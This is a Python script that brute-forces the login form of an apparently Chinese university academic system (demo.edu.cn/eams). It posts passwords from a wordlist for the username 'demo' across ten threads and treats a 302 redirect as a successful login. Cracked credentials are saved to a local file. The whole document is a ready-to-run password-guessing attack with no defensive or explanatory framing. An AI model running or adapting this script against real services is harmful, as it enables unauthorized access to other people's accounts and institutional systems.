from concurrent.futures import ThreadPoolExecutor,ProcessPoolExecutor
import requests

url = "http://demo.edu.cn/eams/login.action"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://demo.edu.cn/eams/login.action",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
    }

with open ("./test.txt") as ff:
    lt_00 = ff.readlines()
    lt_11 = [i.strip() for i in lt_00]
    
lt = lt_11[:100]
ltt = lt_11[-100:]
def ta(q):
        p = "demo"

        print("正在爆破"+str(q))
        kv = {
            "username":p,
            "password":q,
            "encodedPassword":"",
    #        "captcha":"ceems",
            "message":""
            }
        try:
            r = requests.post(url,kv,headers=headers,allow_redirects = False)
            print(r.status_code)
            if r.status_code == 302:               
                print("密码为"+q)
                with open("用户名.txt","a")as f:
                    f.write(p+"\t"+q+"\n")
                exit()
                
                
        except:
            exit()
        
pool = ThreadPoolExecutor(10)
for index in lt_11:
    pool.submit(ta,index)
print("end")
